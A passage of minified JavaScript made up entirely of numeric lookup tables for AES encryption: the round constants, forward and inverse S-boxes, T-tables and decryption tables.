          , Ck = [1, 2, 4, 8, 16, 32, 64, 128, 27, 54, 108, 216, 171, 77, 154, 47, 94, 188, 99, 198, 151, 53, 106, 212, 179, 125, 250, 239, 197, 145]
          , Sk = [99, 124, 119, 123, 242, 107, 111, 197, 48, 1, 103, 43, 254, 215, 171, 118, 202, 130, 201, 125, 250, 89, 71, 240, 173, 212, 162, 175, 156, 164, 114, 192, 183, 253, 147, 38, 54, 63, 247, 204, 52, 165, 229, 241, 113, 216, 49, 21, 4, 199, 35, 195, 24, 150, 5, 154, 7, 18, 128, 226, 235, 39, 178, 117, 9, 131, 44, 26, 27, 110, 90, 160, 82, 59, 214, 179, 41, 227, 47, 132, 83, 209, 0, 237, 32, 252, 177, 91, 106, 203, 190, 57, 74, 76, 88, 207, 208, 239, 170, 251, 67, 77, 51, 133, 69, 249, 2, 127, 80, 60, 159, 168, 81, 163, 64, 143, 146, 157, 56, 245, 188, 182, 218, 33, 16, 255, 243, 210, 205, 12, 19, 236, 95, 151, 68, 23, 196, 167, 126, 61, 100, 93, 25, 115, 96, 129, 79, 220, 34, 42, 144, 136, 70, 238, 184, 20, 222, 94, 11, 219, 224, 50, 58, 10, 73, 6, 36, 92, 194, 211, 172, 98, 145, 149, 228, 121, 231, 200, 55, 109, 141, 213, 78, 169, 108, 86, 244, 234, 101, 122, 174, 8, 186, 120, 37, 46, 28, 166, 180, 198, 232, 221, 116, 31, 75, 189, 139, 138, 112, 62, 181, 102, 72, 3, 246, 14, 97, 53, 87, 185, 134, 193, 29, 158, 225, 248, 152, 17, 105, 217, 142, 148, 155, 30, 135, 233, 206, 85, 40, 223, 140, 161, 137, 13, 191, 230, 66, 104, 65, 153, 45, 15, 176, 84, 187, 22]
          , Ik = [82, 9, 106, 213, 48, 54, 165, 56, 191, 64, 163, 158, 129, 243, 215, 251, 124, 227, 57, 130, 155, 47, 255, 135, 52, 142, 67, 68, 196, 222, 233, 203, 84, 123, 148, 50, 166, 194, 35, 61, 238, 76, 149, 11, 66, 250, 195, 78, 8, 46, 161, 102, 40, 217, 36, 178, 118, 91, 162, 73, 109, 139, 209, 37, 114, 248, 246, 100, 134, 104, 152, 22, 212, 164, 92, 204, 93, 101, 182, 146, 108, 112, 72, 80, 253, 237, 185, 218, 94, 21, 70, 87, 167, 141, 157, 132, 144, 216, 171, 0, 140, 188, 211, 10, 247, 228, 88, 5, 184, 179, 69, 6, 208, 44, 30, 143, 202, 63, 15, 2, 193, 175, 189, 3, 1, 19, 138, 107, 58, 145, 17, 65, 79, 103, 220, 234, 151, 242, 207, 206, 240, 180, 230, 115, 150, 172, 116, 34, 231, 173, 53, 133, 226, 249, 55, 232, 28, 117, 223, 110, 71, 241, 26, 113, 29, 41, 197, 137, 111, 183, 98, 14, 170, 24, 190, 27, 252, 86, 62, 75, 198, 210, 121, 32, 154, 219, 192, 254, 120, 205, 90, 244, 31, 221, 168, 51, 136, 7, 199, 49, 177, 18, 16, 89, 39, 128, 236, 95, 96, 81, 127, 169, 25, 181, 74, 13, 45, 229, 122, 159, 147, 201, 156, 239, 160, 224, 59, 77, 174, 42, 245, 176, 200, 235, 187, 60, 131, 83, 153, 97, 23, 43, 4, 126, 186, 119, 214, 38, 225, 105, 20, 99, 85, 33, 12, 125]
          , Bk = [3328402341, 4168907908, 4000806809, 4135287693, 4294111757, 3597364157, 3731845041, 2445657428, 1613770832, 33620227, 3462883241, 1445669757, 3892248089, 3050821474, 1303096294, 3967186586, 2412431941, 528646813, 2311702848, 4202528135, 4026202645, 2992200171, 2387036105, 4226871307, 1101901292, 3017069671, 1604494077, 1169141738, 597466303, 1403299063, 3832705686, 2613100635, 1974974402, 3791519004, 1033081774, 1277568618, 1815492186, 2118074177, 4126668546, 2211236943, 1748251740, 1369810420, 3521504564, 4193382664, 3799085459, 2883115123, 1647391059, 706024767, 134480908, 2512897874, 1176707941, 2646852446, 806885416, 932615841, 168101135, 798661301, 235341577, 605164086, 461406363, 3756188221, 3454790438, 1311188841, 2142417613, 3933566367, 302582043, 495158174, 1479289972, 874125870, 907746093, 3698224818, 3025820398, 1537253627, 2756858614, 1983593293, 3084310113, 2108928974, 1378429307, 3722699582, 1580150641, 327451799, 2790478837, 3117535592, 0, 3253595436, 1075847264, 3825007647, 2041688520, 3059440621, 3563743934, 2378943302, 1740553945, 1916352843, 2487896798, 2555137236, 2958579944, 2244988746, 3151024235, 3320835882, 1336584933, 3992714006, 2252555205, 2588757463, 1714631509, 293963156, 2319795663, 3925473552, 67240454, 4269768577, 2689618160, 2017213508, 631218106, 1269344483, 2723238387, 1571005438, 2151694528, 93294474, 1066570413, 563977660, 1882732616, 4059428100, 1673313503, 2008463041, 2950355573, 1109467491, 537923632, 3858759450, 4260623118, 3218264685, 2177748300, 403442708, 638784309, 3287084079, 3193921505, 899127202, 2286175436, 773265209, 2479146071, 1437050866, 4236148354, 2050833735, 3362022572, 3126681063, 840505643, 3866325909, 3227541664, 427917720, 2655997905, 2749160575, 1143087718, 1412049534, 999329963, 193497219, 2353415882, 3354324521, 1807268051, 672404540, 2816401017, 3160301282, 369822493, 2916866934, 3688947771, 1681011286, 1949973070, 336202270, 2454276571, 201721354, 1210328172, 3093060836, 2680341085, 3184776046, 1135389935, 3294782118, 965841320, 831886756, 3554993207, 4068047243, 3588745010, 2345191491, 1849112409, 3664604599, 26054028, 2983581028, 2622377682, 1235855840, 3630984372, 2891339514, 4092916743, 3488279077, 3395642799, 4101667470, 1202630377, 268961816, 1874508501, 4034427016, 1243948399, 1546530418, 941366308, 1470539505, 1941222599, 2546386513, 3421038627, 2715671932, 3899946140, 1042226977, 2521517021, 1639824860, 227249030, 260737669, 3765465232, 2084453954, 1907733956, 3429263018, 2420656344, 100860677, 4160157185, 470683154, 3261161891, 1781871967, 2924959737, 1773779408, 394692241, 2579611992, 974986535, 664706745, 3655459128, 3958962195, 731420851, 571543859, 3530123707, 2849626480, 126783113, 865375399, 765172662, 1008606754, 361203602, 3387549984, 2278477385, 2857719295, 1344809080, 2782912378, 59542671, 1503764984, 160008576, 437062935, 1707065306, 3622233649, 2218934982, 3496503480, 2185314755, 697932208, 1512910199, 504303377, 2075177163, 2824099068, 1841019862, 739644986]
          , xk = [2781242211, 2230877308, 2582542199, 2381740923, 234877682, 3184946027, 2984144751, 1418839493, 1348481072, 50462977, 2848876391, 2102799147, 434634494, 1656084439, 3863849899, 2599188086, 1167051466, 2636087938, 1082771913, 2281340285, 368048890, 3954334041, 3381544775, 201060592, 3963727277, 1739838676, 4250903202, 3930435503, 3206782108, 4149453988, 2531553906, 1536934080, 3262494647, 484572669, 2923271059, 1783375398, 1517041206, 1098792767, 49674231, 1334037708, 1550332980, 4098991525, 886171109, 150598129, 2481090929, 1940642008, 1398944049, 1059722517, 201851908, 1385547719, 1699095331, 1587397571, 674240536, 2704774806, 252314885, 3039795866, 151914247, 908333586, 2602270848, 1038082786, 651029483, 1766729511, 3447698098, 2682942837, 454166793, 2652734339, 1951935532, 775166490, 758520603, 3000790638, 4004797018, 4217086112, 4137964114, 1299594043, 1639438038, 3464344499, 2068982057, 1054729187, 1901997871, 2534638724, 4121318227, 1757008337, 0, 750906861, 1614815264, 535035132, 3363418545, 3988151131, 3201591914, 1183697867, 3647454910, 1265776953, 3734260298, 3566750796, 3903871064, 1250283471, 1807470800, 717615087, 3847203498, 384695291, 3313910595, 3617213773, 1432761139, 2484176261, 3481945413, 283769337, 100925954, 2180939647, 4037038160, 1148730428, 3123027871, 3813386408, 4087501137, 4267549603, 3229630528, 2315620239, 2906624658, 3156319645, 1215313976, 82966005, 3747855548, 3245848246, 1974459098, 1665278241, 807407632, 451280895, 251524083, 1841287890, 1283575245, 337120268, 891687699, 801369324, 3787349855, 2721421207, 3431482436, 959321879, 1469301956, 4065699751, 2197585534, 1199193405, 2898814052, 3887750493, 724703513, 2514908019, 2696962144, 2551808385, 3516813135, 2141445340, 1715741218, 2119445034, 2872807568, 2198571144, 3398190662, 700968686, 3547052216, 1009259540, 2041044702, 3803995742, 487983883, 1991105499, 1004265696, 1449407026, 1316239930, 504629770, 3683797321, 168560134, 1816667172, 3837287516, 1570751170, 1857934291, 4014189740, 2797888098, 2822345105, 2754712981, 936633572, 2347923833, 852879335, 1133234376, 1500395319, 3084545389, 2348912013, 1689376213, 3533459022, 3762923945, 3034082412, 4205598294, 133428468, 634383082, 2949277029, 2398386810, 3913789102, 403703816, 3580869306, 2297460856, 1867130149, 1918643758, 607656988, 4049053350, 3346248884, 1368901318, 600565992, 2090982877, 2632479860, 557719327, 3717614411, 3697393085, 2249034635, 2232388234, 2430627952, 1115438654, 3295786421, 2865522278, 3633334344, 84280067, 33027830, 303828494, 2747425121, 1600795957, 4188952407, 3496589753, 2434238086, 1486471617, 658119965, 3106381470, 953803233, 334231800, 3005978776, 857870609, 3151128937, 1890179545, 2298973838, 2805175444, 3056442267, 574365214, 2450884487, 550103529, 1233637070, 4289353045, 2018519080, 2057691103, 2399374476, 4166623649, 2148108681, 387583245, 3664101311, 836232934, 3330556482, 3100665960, 3280093505, 2955516313, 2002398509, 287182607, 3413881008, 4238890068, 3597515707, 975967766]
          , Ok = [1671808611, 2089089148, 2006576759, 2072901243, 4061003762, 1807603307, 1873927791, 3310653893, 810573872, 16974337, 1739181671, 729634347, 4263110654, 3613570519, 2883997099, 1989864566, 3393556426, 2191335298, 3376449993, 2106063485, 4195741690, 1508618841, 1204391495, 4027317232, 2917941677, 3563566036, 2734514082, 2951366063, 2629772188, 2767672228, 1922491506, 3227229120, 3082974647, 4246528509, 2477669779, 644500518, 911895606, 1061256767, 4144166391, 3427763148, 878471220, 2784252325, 3845444069, 4043897329, 1905517169, 3631459288, 827548209, 356461077, 67897348, 3344078279, 593839651, 3277757891, 405286936, 2527147926, 84871685, 2595565466, 118033927, 305538066, 2157648768, 3795705826, 3945188843, 661212711, 2999812018, 1973414517, 152769033, 2208177539, 745822252, 439235610, 455947803, 1857215598, 1525593178, 2700827552, 1391895634, 994932283, 3596728278, 3016654259, 695947817, 3812548067, 795958831, 2224493444, 1408607827, 3513301457, 0, 3979133421, 543178784, 4229948412, 2982705585, 1542305371, 1790891114, 3410398667, 3201918910, 961245753, 1256100938, 1289001036, 1491644504, 3477767631, 3496721360, 4012557807, 2867154858, 4212583931, 1137018435, 1305975373, 861234739, 2241073541, 1171229253, 4178635257, 33948674, 2139225727, 1357946960, 1011120188, 2679776671, 2833468328, 1374921297, 2751356323, 1086357568, 2408187279, 2460827538, 2646352285, 944271416, 4110742005, 3168756668, 3066132406, 3665145818, 560153121, 271589392, 4279952895, 4077846003, 3530407890, 3444343245, 202643468, 322250259, 3962553324, 1608629855, 2543990167, 1154254916, 389623319, 3294073796, 2817676711, 2122513534, 1028094525, 1689045092, 1575467613, 422261273, 1939203699, 1621147744, 2174228865, 1339137615, 3699352540, 577127458, 712922154, 2427141008, 2290289544, 1187679302, 3995715566, 3100863416, 339486740, 3732514782, 1591917662, 186455563, 3681988059, 3762019296, 844522546, 978220090, 169743370, 1239126601, 101321734, 611076132, 1558493276, 3260915650, 3547250131, 2901361580, 1655096418, 2443721105, 2510565781, 3828863972, 2039214713, 3878868455, 3359869896, 928607799, 1840765549, 2374762893, 3580146133, 1322425422, 2850048425, 1823791212, 1459268694, 4094161908, 3928346602, 1706019429, 2056189050, 2934523822, 135794696, 3134549946, 2022240376, 628050469, 779246638, 472135708, 2800834470, 3032970164, 3327236038, 3894660072, 3715932637, 1956440180, 522272287, 1272813131, 3185336765, 2340818315, 2323976074, 1888542832, 1044544574, 3049550261, 1722469478, 1222152264, 50660867, 4127324150, 236067854, 1638122081, 895445557, 1475980887, 3117443513, 2257655686, 3243809217, 489110045, 2662934430, 3778599393, 4162055160, 2561878936, 288563729, 1773916777, 3648039385, 2391345038, 2493985684, 2612407707, 505560094, 2274497927, 3911240169, 3460925390, 1442818645, 678973480, 3749357023, 2358182796, 2717407649, 2306869641, 219617805, 3218761151, 3862026214, 1120306242, 1756942440, 1103331905, 2578459033, 762796589, 252780047, 2966125488, 1425844308, 3151392187, 372911126]
          , _k = [1667474886, 2088535288, 2004326894, 2071694838, 4075949567, 1802223062, 1869591006, 3318043793, 808472672, 16843522, 1734846926, 724270422, 4278065639, 3621216949, 2880169549, 1987484396, 3402253711, 2189597983, 3385409673, 2105378810, 4210693615, 1499065266, 1195886990, 4042263547, 2913856577, 3570689971, 2728590687, 2947541573, 2627518243, 2762274643, 1920112356, 3233831835, 3082273397, 4261223649, 2475929149, 640051788, 909531756, 1061110142, 4160160501, 3435941763, 875846760, 2779116625, 3857003729, 4059105529, 1903268834, 3638064043, 825316194, 353713962, 67374088, 3351728789, 589522246, 3284360861, 404236336, 2526454071, 84217610, 2593830191, 117901582, 303183396, 2155911963, 3806477791, 3958056653, 656894286, 2998062463, 1970642922, 151591698, 2206440989, 741110872, 437923380, 454765878, 1852748508, 1515908788, 2694904667, 1381168804, 993742198, 3604373943, 3014905469, 690584402, 3823320797, 791638366, 2223281939, 1398011302, 3520161977, 0, 3991743681, 538992704, 4244381667, 2981218425, 1532751286, 1785380564, 3419096717, 3200178535, 960056178, 1246420628, 1280103576, 1482221744, 3486468741, 3503319995, 4025428677, 2863326543, 4227536621, 1128514950, 1296947098, 859002214, 2240123921, 1162203018, 4193849577, 33687044, 2139062782, 1347481760, 1010582648, 2678045221, 2829640523, 1364325282, 2745433693, 1077985408, 2408548869, 2459086143, 2644360225, 943212656, 4126475505, 3166494563, 3065430391, 3671750063, 555836226, 269496352, 4294908645, 4092792573, 3537006015, 3452783745, 202118168, 320025894, 3974901699, 1600119230, 2543297077, 1145359496, 387397934, 3301201811, 2812801621, 2122220284, 1027426170, 1684319432, 1566435258, 421079858, 1936954854, 1616945344, 2172753945, 1330631070, 3705438115, 572679748, 707427924, 2425400123, 2290647819, 1179044492, 4008585671, 3099120491, 336870440, 3739122087, 1583276732, 185277718, 3688593069, 3772791771, 842159716, 976899700, 168435220, 1229577106, 101059084, 606366792, 1549591736, 3267517855, 3553849021, 2897014595, 1650632388, 2442242105, 2509612081, 3840161747, 2038008818, 3890688725, 3368567691, 926374254, 1835907034, 2374863873, 3587531953, 1313788572, 2846482505, 1819063512, 1448540844, 4109633523, 3941213647, 1701162954, 2054852340, 2930698567, 134748176, 3132806511, 2021165296, 623210314, 774795868, 471606328, 2795958615, 3031746419, 3334885783, 3907527627, 3722280097, 1953799400, 522133822, 1263263126, 3183336545, 2341176845, 2324333839, 1886425312, 1044267644, 3048588401, 1718004428, 1212733584, 50529542, 4143317495, 235803164, 1633788866, 892690282, 1465383342, 3115962473, 2256965911, 3250673817, 488449850, 2661202215, 3789633753, 4177007595, 2560144171, 286339874, 1768537042, 3654906025, 2391705863, 2492770099, 2610673197, 505291324, 2273808917, 3924369609, 3469625735, 1431699370, 673740880, 3755965093, 2358021891, 2711746649, 2307489801, 218961690, 3217021541, 3873845719, 1111672452, 1751693520, 1094828930, 2576986153, 757954394, 252645662, 2964376443, 1414855848, 3149649517, 370555436]
          , Wk = [1374988112, 2118214995, 437757123, 975658646, 1001089995, 530400753, 2902087851, 1273168787, 540080725, 2910219766, 2295101073, 4110568485, 1340463100, 3307916247, 641025152, 3043140495, 3736164937, 632953703, 1172967064, 1576976609, 3274667266, 2169303058, 2370213795, 1809054150, 59727847, 361929877, 3211623147, 2505202138, 3569255213, 1484005843, 1239443753, 2395588676, 1975683434, 4102977912, 2572697195, 666464733, 3202437046, 4035489047, 3374361702, 2110667444, 1675577880, 3843699074, 2538681184, 1649639237, 2976151520, 3144396420, 4269907996, 4178062228, 1883793496, 2403728665, 2497604743, 1383856311, 2876494627, 1917518562, 3810496343, 1716890410, 3001755655, 800440835, 2261089178, 3543599269, 807962610, 599762354, 33778362, 3977675356, 2328828971, 2809771154, 4077384432, 1315562145, 1708848333, 101039829, 3509871135, 3299278474, 875451293, 2733856160, 92987698, 2767645557, 193195065, 1080094634, 1584504582, 3178106961, 1042385657, 2531067453, 3711829422, 1306967366, 2438237621, 1908694277, 67556463, 1615861247, 429456164, 3602770327, 2302690252, 1742315127, 2968011453, 126454664, 3877198648, 2043211483, 2709260871, 2084704233, 4169408201, 0, 159417987, 841739592, 504459436, 1817866830, 4245618683, 260388950, 1034867998, 908933415, 168810852, 1750902305, 2606453969, 607530554, 202008497, 2472011535, 3035535058, 463180190, 2160117071, 1641816226, 1517767529, 470948374, 3801332234, 3231722213, 1008918595, 303765277, 235474187, 4069246893, 766945465, 337553864, 1475418501, 2943682380, 4003061179, 2743034109, 4144047775, 1551037884, 1147550661, 1543208500, 2336434550, 3408119516, 3069049960, 3102011747, 3610369226, 1113818384, 328671808, 2227573024, 2236228733, 3535486456, 2935566865, 3341394285, 496906059, 3702665459, 226906860, 2009195472, 733156972, 2842737049, 294930682, 1206477858, 2835123396, 2700099354, 1451044056, 573804783, 2269728455, 3644379585, 2362090238, 2564033334, 2801107407, 2776292904, 3669462566, 1068351396, 742039012, 1350078989, 1784663195, 1417561698, 4136440770, 2430122216, 775550814, 2193862645, 2673705150, 1775276924, 1876241833, 3475313331, 3366754619, 270040487, 3902563182, 3678124923, 3441850377, 1851332852, 3969562369, 2203032232, 3868552805, 2868897406, 566021896, 4011190502, 3135740889, 1248802510, 3936291284, 699432150, 832877231, 708780849, 3332740144, 899835584, 1951317047, 4236429990, 3767586992, 866637845, 4043610186, 1106041591, 2144161806, 395441711, 1984812685, 1139781709, 3433712980, 3835036895, 2664543715, 1282050075, 3240894392, 1181045119, 2640243204, 25965917, 4203181171, 4211818798, 3009879386, 2463879762, 3910161971, 1842759443, 2597806476, 933301370, 1509430414, 3943906441, 3467192302, 3076639029, 3776767469, 2051518780, 2631065433, 1441952575, 404016761, 1942435775, 1408749034, 1610459739, 3745345300, 2017778566, 3400528769, 3110650942, 941896748, 3265478751, 371049330, 3168937228, 675039627, 4279080257, 967311729, 135050206, 3635733660, 1683407248, 2076935265, 3576870512, 1215061108, 3501741890]
          , Rk = [1347548327, 1400783205, 3273267108, 2520393566, 3409685355, 4045380933, 2880240216, 2471224067, 1428173050, 4138563181, 2441661558, 636813900, 4233094615, 3620022987, 2149987652, 2411029155, 1239331162, 1730525723, 2554718734, 3781033664, 46346101, 310463728, 2743944855, 3328955385, 3875770207, 2501218972, 3955191162, 3667219033, 768917123, 3545789473, 692707433, 1150208456, 1786102409, 2029293177, 1805211710, 3710368113, 3065962831, 401639597, 1724457132, 3028143674, 409198410, 2196052529, 1620529459, 1164071807, 3769721975, 2226875310, 486441376, 2499348523, 1483753576, 428819965, 2274680428, 3075636216, 598438867, 3799141122, 1474502543, 711349675, 129166120, 53458370, 2592523643, 2782082824, 4063242375, 2988687269, 3120694122, 1559041666, 730517276, 2460449204, 4042459122, 2706270690, 3446004468, 3573941694, 533804130, 2328143614, 2637442643, 2695033685, 839224033, 1973745387, 957055980, 2856345839, 106852767, 1371368976, 4181598602, 1033297158, 2933734917, 1179510461, 3046200461, 91341917, 1862534868, 4284502037, 605657339, 2547432937, 3431546947, 2003294622, 3182487618, 2282195339, 954669403, 3682191598, 1201765386, 3917234703, 3388507166, 0, 2198438022, 1211247597, 2887651696, 1315723890, 4227665663, 1443857720, 507358933, 657861945, 1678381017, 560487590, 3516619604, 975451694, 2970356327, 261314535, 3535072918, 2652609425, 1333838021, 2724322336, 1767536459, 370938394, 182621114, 3854606378, 1128014560, 487725847, 185469197, 2918353863, 3106780840, 3356761769, 2237133081, 1286567175, 3152976349, 4255350624, 2683765030, 3160175349, 3309594171, 878443390, 1988838185, 3704300486, 1756818940, 1673061617, 3403100636, 272786309, 1075025698, 545572369, 2105887268, 4174560061, 296679730, 1841768865, 1260232239, 4091327024, 3960309330, 3497509347, 1814803222, 2578018489, 4195456072, 575138148, 3299409036, 446754879, 3629546796, 4011996048, 3347532110, 3252238545, 4270639778, 915985419, 3483825537, 681933534, 651868046, 2755636671, 3828103837, 223377554, 2607439820, 1649704518, 3270937875, 3901806776, 1580087799, 4118987695, 3198115200, 2087309459, 2842678573, 3016697106, 1003007129, 2802849917, 1860738147, 2077965243, 164439672, 4100872472, 32283319, 2827177882, 1709610350, 2125135846, 136428751, 3874428392, 3652904859, 3460984630, 3572145929, 3593056380, 2939266226, 824852259, 818324884, 3224740454, 930369212, 2801566410, 2967507152, 355706840, 1257309336, 4148292826, 243256656, 790073846, 2373340630, 1296297904, 1422699085, 3756299780, 3818836405, 457992840, 3099667487, 2135319889, 77422314, 1560382517, 1945798516, 788204353, 1521706781, 1385356242, 870912086, 325965383, 2358957921, 2050466060, 2388260884, 2313884476, 4006521127, 901210569, 3990953189, 1014646705, 1503449823, 1062597235, 2031621326, 3212035895, 3931371469, 1533017514, 350174575, 2256028891, 2177544179, 1052338372, 741876788, 1606591296, 1914052035, 213705253, 2334669897, 1107234197, 1899603969, 3725069491, 2631447780, 2422494913, 1635502980, 1893020342, 1950903388, 1120974935]
          , kk = [2807058932, 1699970625, 2764249623, 1586903591, 1808481195, 1173430173, 1487645946, 59984867, 4199882800, 1844882806, 1989249228, 1277555970, 3623636965, 3419915562, 1149249077, 2744104290, 1514790577, 459744698, 244860394, 3235995134, 1963115311, 4027744588, 2544078150, 4190530515, 1608975247, 2627016082, 2062270317, 1507497298, 2200818878, 567498868, 1764313568, 3359936201, 2305455554, 2037970062, 1047239e3, 1910319033, 1337376481, 2904027272, 2892417312, 984907214, 1243112415, 830661914, 861968209, 2135253587, 2011214180, 2927934315, 2686254721, 731183368, 1750626376, 4246310725, 1820824798, 4172763771, 3542330227, 48394827, 2404901663, 2871682645, 671593195, 3254988725, 2073724613, 145085239, 2280796200, 2779915199, 1790575107, 2187128086, 472615631, 3029510009, 4075877127, 3802222185, 4107101658, 3201631749, 1646252340, 4270507174, 1402811438, 1436590835, 3778151818, 3950355702, 3963161475, 4020912224, 2667994737, 273792366, 2331590177, 104699613, 95345982, 3175501286, 2377486676, 1560637892, 3564045318, 369057872, 4213447064, 3919042237, 1137477952, 2658625497, 1119727848, 2340947849, 1530455833, 4007360968, 172466556, 266959938, 516552836, 0, 2256734592, 3980931627, 1890328081, 1917742170, 4294704398, 945164165, 3575528878, 958871085, 3647212047, 2787207260, 1423022939, 775562294, 1739656202, 3876557655, 2530391278, 2443058075, 3310321856, 547512796, 1265195639, 437656594, 3121275539, 719700128, 3762502690, 387781147, 218828297, 3350065803, 2830708150, 2848461854, 428169201, 122466165, 3720081049, 1627235199, 648017665, 4122762354, 1002783846, 2117360635, 695634755, 3336358691, 4234721005, 4049844452, 3704280881, 2232435299, 574624663, 287343814, 612205898, 1039717051, 840019705, 2708326185, 793451934, 821288114, 1391201670, 3822090177, 376187827, 3113855344, 1224348052, 1679968233, 2361698556, 1058709744, 752375421, 2431590963, 1321699145, 3519142200, 2734591178, 188127444, 2177869557, 3727205754, 2384911031, 3215212461, 2648976442, 2450346104, 3432737375, 1180849278, 331544205, 3102249176, 4150144569, 2952102595, 2159976285, 2474404304, 766078933, 313773861, 2570832044, 2108100632, 1668212892, 3145456443, 2013908262, 418672217, 3070356634, 2594734927, 1852171925, 3867060991, 3473416636, 3907448597, 2614737639, 919489135, 164948639, 2094410160, 2997825956, 590424639, 2486224549, 1723872674, 3157750862, 3399941250, 3501252752, 3625268135, 2555048196, 3673637356, 1343127501, 4130281361, 3599595085, 2957853679, 1297403050, 81781910, 3051593425, 2283490410, 532201772, 1367295589, 3926170974, 895287692, 1953757831, 1093597963, 492483431, 3528626907, 1446242576, 1192455638, 1636604631, 209336225, 344873464, 1015671571, 669961897, 3375740769, 3857572124, 2973530695, 3747192018, 1933530610, 3464042516, 935293895, 3454686199, 2858115069, 1863638845, 3683022916, 4085369519, 3292445032, 875313188, 1080017571, 3279033885, 621591778, 1233856572, 2504130317, 24197544, 3017672716, 3835484340, 3247465558, 2220981195, 3060847922, 1551124588, 1463996600]
          , Mk = [4104605777, 1097159550, 396673818, 660510266, 2875968315, 2638606623, 4200115116, 3808662347, 821712160, 1986918061, 3430322568, 38544885, 3856137295, 718002117, 893681702, 1654886325, 2975484382, 3122358053, 3926825029, 4274053469, 796197571, 1290801793, 1184342925, 3556361835, 2405426947, 2459735317, 1836772287, 1381620373, 3196267988, 1948373848, 3764988233, 3385345166, 3263785589, 2390325492, 1480485785, 3111247143, 3780097726, 2293045232, 548169417, 3459953789, 3746175075, 439452389, 1362321559, 1400849762, 1685577905, 1806599355, 2174754046, 137073913, 1214797936, 1174215055, 3731654548, 2079897426, 1943217067, 1258480242, 529487843, 1437280870, 3945269170, 3049390895, 3313212038, 923313619, 679998e3, 3215307299, 57326082, 377642221, 3474729866, 2041877159, 133361907, 1776460110, 3673476453, 96392454, 878845905, 2801699524, 777231668, 4082475170, 2330014213, 4142626212, 2213296395, 1626319424, 1906247262, 1846563261, 562755902, 3708173718, 1040559837, 3871163981, 1418573201, 3294430577, 114585348, 1343618912, 2566595609, 3186202582, 1078185097, 3651041127, 3896688048, 2307622919, 425408743, 3371096953, 2081048481, 1108339068, 2216610296, 0, 2156299017, 736970802, 292596766, 1517440620, 251657213, 2235061775, 2933202493, 758720310, 265905162, 1554391400, 1532285339, 908999204, 174567692, 1474760595, 4002861748, 2610011675, 3234156416, 3693126241, 2001430874, 303699484, 2478443234, 2687165888, 585122620, 454499602, 151849742, 2345119218, 3064510765, 514443284, 4044981591, 1963412655, 2581445614, 2137062819, 19308535, 1928707164, 1715193156, 4219352155, 1126790795, 600235211, 3992742070, 3841024952, 836553431, 1669664834, 2535604243, 3323011204, 1243905413, 3141400786, 4180808110, 698445255, 2653899549, 2989552604, 2253581325, 3252932727, 3004591147, 1891211689, 2487810577, 3915653703, 4237083816, 4030667424, 2100090966, 865136418, 1229899655, 953270745, 3399679628, 3557504664, 4118925222, 2061379749, 3079546586, 2915017791, 983426092, 2022837584, 1607244650, 2118541908, 2366882550, 3635996816, 972512814, 3283088770, 1568718495, 3499326569, 3576539503, 621982671, 2895723464, 410887952, 2623762152, 1002142683, 645401037, 1494807662, 2595684844, 1335535747, 2507040230, 4293295786, 3167684641, 367585007, 3885750714, 1865862730, 2668221674, 2960971305, 2763173681, 1059270954, 2777952454, 2724642869, 1320957812, 2194319100, 2429595872, 2815956275, 77089521, 3973773121, 3444575871, 2448830231, 1305906550, 4021308739, 2857194700, 2516901860, 3518358430, 1787304780, 740276417, 1699839814, 1592394909, 2352307457, 2272556026, 188821243, 1729977011, 3687994002, 274084841, 3594982253, 3613494426, 2701949495, 4162096729, 322734571, 2837966542, 1640576439, 484830689, 1202797690, 3537852828, 4067639125, 349075736, 3342319475, 4157467219, 4255800159, 1030690015, 1155237496, 2951971274, 1757691577, 607398968, 2738905026, 499347990, 3794078908, 1011452712, 227885567, 2818666809, 213114376, 3034881240, 1455525988, 3414450555, 850817237, 1817998408, 3092726480]
          , Nk = [0, 235474187, 470948374, 303765277, 941896748, 908933415, 607530554, 708780849, 1883793496, 2118214995, 1817866830, 1649639237, 1215061108, 1181045119, 1417561698, 1517767529, 3767586992, 4003061179, 4236429990, 4069246893, 3635733660, 3602770327, 3299278474, 3400528769, 2430122216, 2664543715, 2362090238, 2193862645, 2835123396, 2801107407, 3035535058, 3135740889, 3678124923, 3576870512, 3341394285, 3374361702, 3810496343, 3977675356, 4279080257, 4043610186, 2876494627, 2776292904, 3076639029, 3110650942, 2472011535, 2640243204, 2403728665, 2169303058, 1001089995, 899835584, 666464733, 699432150, 59727847, 226906860, 530400753, 294930682, 1273168787, 1172967064, 1475418501, 1509430414, 1942435775, 2110667444, 1876241833, 1641816226, 2910219766, 2743034109, 2976151520, 3211623147, 2505202138, 2606453969, 2302690252, 2269728455, 3711829422, 3543599269, 3240894392, 3475313331, 3843699074, 3943906441, 4178062228, 4144047775, 1306967366, 1139781709, 1374988112, 1610459739, 1975683434, 2076935265, 1775276924, 1742315127, 1034867998, 866637845, 566021896, 800440835, 92987698, 193195065, 429456164, 395441711, 1984812685, 2017778566, 1784663195, 1683407248, 1315562145, 1080094634, 1383856311, 1551037884, 101039829, 135050206, 437757123, 337553864, 1042385657, 807962610, 573804783, 742039012, 2531067453, 2564033334, 2328828971, 2227573024, 2935566865, 2700099354, 3001755655, 3168937228, 3868552805, 3902563182, 4203181171, 4102977912, 3736164937, 3501741890, 3265478751, 3433712980, 1106041591, 1340463100, 1576976609, 1408749034, 2043211483, 2009195472, 1708848333, 1809054150, 832877231, 1068351396, 766945465, 599762354, 159417987, 126454664, 361929877, 463180190, 2709260871, 2943682380, 3178106961, 3009879386, 2572697195, 2538681184, 2236228733, 2336434550, 3509871135, 3745345300, 3441850377, 3274667266, 3910161971, 3877198648, 4110568485, 4211818798, 2597806476, 2497604743, 2261089178, 2295101073, 2733856160, 2902087851, 3202437046, 2968011453, 3936291284, 3835036895, 4136440770, 4169408201, 3535486456, 3702665459, 3467192302, 3231722213, 2051518780, 1951317047, 1716890410, 1750902305, 1113818384, 1282050075, 1584504582, 1350078989, 168810852, 67556463, 371049330, 404016761, 841739592, 1008918595, 775550814, 540080725, 3969562369, 3801332234, 4035489047, 4269907996, 3569255213, 3669462566, 3366754619, 3332740144, 2631065433, 2463879762, 2160117071, 2395588676, 2767645557, 2868897406, 3102011747, 3069049960, 202008497, 33778362, 270040487, 504459436, 875451293, 975658646, 675039627, 641025152, 2084704233, 1917518562, 1615861247, 1851332852, 1147550661, 1248802510, 1484005843, 1451044056, 933301370, 967311729, 733156972, 632953703, 260388950, 25965917, 328671808, 496906059, 1206477858, 1239443753, 1543208500, 1441952575, 2144161806, 1908694277, 1675577880, 1842759443, 3610369226, 3644379585, 3408119516, 3307916247, 4011190502, 3776767469, 4077384432, 4245618683, 2809771154, 2842737049, 3144396420, 3043140495, 2673705150, 2438237621, 2203032232, 2370213795]
